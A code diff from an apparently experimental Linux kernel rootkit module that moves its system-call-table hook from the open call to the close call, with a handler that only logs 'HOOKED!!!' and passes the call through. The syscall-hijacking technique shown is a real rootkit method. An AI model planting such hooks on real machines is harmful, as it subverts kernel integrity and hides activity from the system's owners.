@@ -59,13 +59,13 @@ static void unhook_all(void)
     protect_memory();
 }
 
-asmlinkage long sys_open_fake(unsigned int fd)
+asmlinkage long sys_close_fake(unsigned int fd)
 {
-    long (*orig_open)(unsigned int) = (long (*)(unsigned int))(sys_call_table[__NR_open]);
+    long (*orig_close)(unsigned int) = (long (*)(unsigned int))(sys_call_table[__NR_close]);
 
     printk(KERN_ALERT "HOOKED!!!\n");
     
-    return orig_open(fd);
+    return orig_close(fd);
 }
 
 static int __init init_rootkit(void)
@@ -76,7 +76,7 @@ static int __init init_rootkit(void)
     
     printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);
 
-    hook_syscall(__NR_open, (unsigned long)sys_open_fake);
+    hook_syscall(__NR_close, (unsigned long)sys_close_fake);
 
     return 0;
 }
